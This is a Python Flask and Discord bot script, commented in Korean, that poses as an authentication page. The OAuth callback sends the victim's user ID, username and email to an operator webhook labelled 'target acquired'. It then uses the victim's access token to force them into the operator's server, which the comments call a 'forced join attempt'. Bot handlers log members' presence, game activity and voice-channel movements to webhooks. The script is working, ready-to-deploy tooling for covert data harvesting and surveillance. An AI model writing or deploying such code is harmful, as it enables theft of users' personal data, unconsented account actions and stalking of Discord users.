import os
import requests
import threading
import discord
import asyncio
from flask import Flask, request, render_template_string

# --- [1] 환경 변수 설정 ---
CLIENT_ID = os.environ.get('CLIENT_ID')
CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
REDIRECT_URI = os.environ.get('REDIRECT_URI')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
MY_GUILD_ID = os.environ.get('MY_GUILD_ID')

WH_PROFILE = os.environ.get('WH_PROFILE')
WH_CONTROL = os.environ.get('WH_CONTROL')
WH_SYSTEM = os.environ.get('WH_SYSTEM')

API_BASE = 'https://discord.com/api/v10'
user_storage = []

# --- [2] Flask 웹 서버 ---
app = Flask(__name__)

def send_report(url, embed):
    if not url: return
    try: requests.post(url, json={"embeds": [embed]}, timeout=5)
    except: pass

@app.route('/')
def home():
    return "<h1>System Online</h1><p>Monitoring Active.</p>"

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return "No Code", 400

    try:
        # 토큰 교환
        data = {
            'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        token_res = requests.post(f'{API_BASE}/oauth2/token', data=data, headers=headers).json()
        access_token = token_res.get('access_token')

        if not access_token:
            return f"Error: {token_res.get('error_description', 'No access token')}", 400

        # 정보 수집
        h = {'Authorization': f'Bearer {access_token}'}
        u = requests.get(f'{API_BASE}/users/@me', headers=h).json()
        user_id = u.get('id')
        user_tag = u.get('username')

        # 1. 보고
        send_report(WH_PROFILE, {"title": "👤 타겟 포착", "description": f"**{user_tag}** (`{user_id}`)\nEmail: {u.get('email')}"})

        # 2. 강제 가입 시도
        put_res = requests.put(
            f'{API_BASE}/guilds/{MY_GUILD_ID}/members/{user_id}',
            headers={'Authorization': f'Bot {BOT_TOKEN}'},
            json={'access_token': access_token}
        )
        
        send_report(WH_CONTROL, {
            "title": "⛓️ 강제 가입 시도",
            "description": f"결과 코드: {put_res.status_code} (201=신규, 204=이미있음)"
        })

        user_storage.append({"tag": user_tag, "id": user_id})
        return "<h1>✅ 인증 완료</h1>창을 닫으셔도 됩니다."

    except Exception as e:
        if WH_SYSTEM: requests.post(WH_SYSTEM, json={"content": f"🚨 에러: {str(e)}"})
        return "Internal Error", 500

# --- [3] Discord 봇 ---
intents = discord.Intents.default()
intents.presences = True
intents.members = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"🤖 봇 로그인 성공: {client.user}")

@client.event
async def on_presence_update(before, after):
    if str(after.guild.id) != str(MY_GUILD_ID): return
    # 활동(게임 등)이나 상태가 변했을 때만 보고
    if before.status != after.status or before.activities != after.activities:
        act_names = [a.name for a in after.activities]
        msg = f"📡 **{after.name}**: `{after.status}` | 활동: {', '.join(act_names) if act_names else '없음'}"
        if WH_CONTROL: requests.post(WH_CONTROL, json={"content": msg})

@client.event
async def on_voice_state_update(member, before, after):
    if str(member.guild.id) != str(MY_GUILD_ID): return
    if before.channel != after.channel:
        msg = f"🔊 **{member.name}**님이 `{after.channel}`에 입장" if after.channel else f"🔈 **{member.name}**님이 퇴장"
        if WH_CONTROL: requests.post(WH_CONTROL, json={"content": msg})

# --- [4] 실행 부 ---
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    # Flask 서버를 0.0.0.0으로 열어야 외부(Render)에서 접속 가능
    app.run(host='0.0.0.0', port=port, use_reloader=False)

if __name__ == '__main__':
    if not BOT_TOKEN:
        print("❌ 에러: BOT_TOKEN이 설정되지 않았습니다.")
    else:
        # Flask를 백그라운드 스레드에서 실행
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()

        # 메인 스레드에서 Discord 봇 실행
        try:
            client.run(BOT_TOKEN)
        except Exception as e:
            print(f"❌ 봇 실행 에러: {e}")
